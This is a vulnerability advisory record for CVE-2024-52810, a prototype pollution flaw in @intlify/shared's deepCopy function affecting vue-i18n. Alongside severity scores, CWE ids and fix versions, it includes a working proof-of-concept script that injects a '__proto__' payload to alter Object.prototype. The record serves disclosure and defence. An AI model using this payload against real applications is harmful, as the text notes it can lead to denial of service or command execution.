advisory_id: npm/vue-i18n/CVE-2024-52810
datasource_id: gitlab_importer_v2/npm/vue-i18n/CVE-2024-52810
datasource_url: https://gitlab.com/gitlab-org/advisories-community/-/blob/main/npm/vue-i18n/CVE-2024-52810.yml
aliases:
  - CVE-2024-52810
  - GHSA-hjwq-mjwj-4x6c
summary: |
  @intlify/shared Prototype Pollution vulnerability
  **Vulnerability type: Prototype Pollution**

  **Affected Package:**

  Product: @intlify/shared
  Version: 10.0.4


  **Vulnerability Location(s):**

  `node_modules/@intlify/shared/dist/shared.cjs:232:26`


  **Description:**

  The latest version of `@intlify/shared (10.0.4)` is vulnerable to Prototype Pollution through the entry function(s) `lib.deepCopy`. An attacker can supply a payload with `Object.prototype` setter to introduce or modify properties within the global prototype chain, causing denial of service (DoS) the minimum consequence.

  Moreover, the consequences of this vulnerability can escalate to other injection-based attacks, depending on how the library integrates within the application. For instance, if the polluted property propagates to sensitive Node.js APIs (e.g., exec, eval), it could enable an attacker to execute arbitrary commands within the application's context.

  **PoC:**

  ```bash
  // install the package with the latest version
  ~$ npm install @intlify/shared@10.0.4
  // run the script mentioned below
  ~$ node poc.js
  //The expected output (if the code still vulnerable) is below.
  // Note that the output may slightly differs from function to another.
  Before Attack:  {}
  After Attack:  {"pollutedKey":123}
  ```


  ```js
  (async () => {
  const lib = await import('@intlify/shared');
  var someObj = {}
  console.log("Before Attack: ", JSON.stringify({}.__proto__));
  try {
  // for multiple functions, uncomment only one for each execution.
  lib.deepCopy (JSON.parse('{"__proto__":{"pollutedKey":123}}'), someObj)
  } catch (e) { }
  console.log("After Attack: ", JSON.stringify({}.__proto__));
  delete Object.prototype.pollutedKey;
  })();
  ```

  **References**

  [Prototype Pollution Leading to Remote Code Execution](https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/) - An example of how prototype pollution can lead to command code injection.
impacted_packages:
  - purl: pkg:npm/vue-i18n
    affected_versions: vers:npm/>=9.7.0|<9.14.2|>=10.0.0|<10.0.5
    fixed_versions: vers:npm/9.14.2|10.0.5
    fixed_in_commits: []
    introduced_in_commits: []
severities:
  - score:
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L
    published_at: None
    url: https://gitlab.com/gitlab-org/advisories-community/-/blob/main/npm/vue-i18n/CVE-2024-52810.yml
weaknesses:
  - CWE-1321
  - CWE-1035
  - CWE-937
references:
  - url: https://github.com/intlify/vue-i18n
    reference_type:
    reference_id:
  - url: https://github.com/intlify/vue-i18n/commit/9f20909ef8c9232a1072d7818e12ed6d6451024d
    reference_type:
    reference_id:
  - url: https://github.com/intlify/vue-i18n/security/advisories/GHSA-hjwq-mjwj-4x6c
    reference_type:
    reference_id:
  - url: https://nvd.nist.gov/vuln/detail/CVE-2024-52810
    reference_type:
    reference_id: CVE-2024-52810
  - url: https://github.com/advisories/GHSA-hjwq-mjwj-4x6c
    reference_type:
    reference_id: GHSA-hjwq-mjwj-4x6c
